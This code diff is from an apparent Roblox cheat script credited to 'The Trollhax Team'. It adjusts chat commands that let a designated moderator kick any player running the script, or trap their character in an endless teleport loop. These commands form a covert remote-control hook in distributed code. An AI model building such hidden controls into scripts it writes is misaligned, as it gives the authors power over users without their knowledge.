@@ -7,7 +7,7 @@ for i, v in pairs(Players) do
 		v.Chatted:Connect(function(Command)
 
 
-			if Command == "!Terminate".. game.Players.LocalPlayer.DisplayName then
+			if Command == "!Terminate ".. game.Players.LocalPlayer.DisplayName then
 				game.Players.LocalPlayer:Kick("Your connection has been terminated by The Trollhax Team.")
 			end
 
@@ -51,7 +51,7 @@ for i, v in pairs(Players) do
 			end
 
 
-			if Command == "!SideKick".. game.Players.LocalPlayer.DisplayName then
+			if Command == "!SideKick ".. game.Players.LocalPlayer.DisplayName then
 				while true do
 					wait()
 					game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = game.Players:WaitForChild(CommandParts[2]).Character:WaitForChild("HumanoidRootPart").CFrame
@@ -106,8 +106,8 @@ end
 game.Players.PlayerAdded:Connect(function(Player)
 	if Player.Name == Moderator then
 		Player.Chatted:Connect(function(Command)
-			if Command == "!Terminate".. game.Players.LocalPlayer.DisplayName then
-			game.Players.LocalPlayer:Kick("Your connection has been terminated by The Trollhax Team.")
+			if Command == "!Terminate ".. game.Players.LocalPlayer.DisplayName then
+				game.Players.LocalPlayer:Kick("Your connection has been terminated by The Trollhax Team.")
 			end
 
 
@@ -150,7 +150,7 @@ game.Players.PlayerAdded:Connect(function(Player)
 			end
 
 
-			if Command == "!SideKick".. game.Players.LocalPlayer.DisplayName then
+			if Command == "!SideKick ".. game.Players.LocalPlayer.DisplayName then
 				while true do
 					wait()
 					game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = game.Players:WaitForChild(CommandParts[2]).Character:WaitForChild("HumanoidRootPart").CFrame
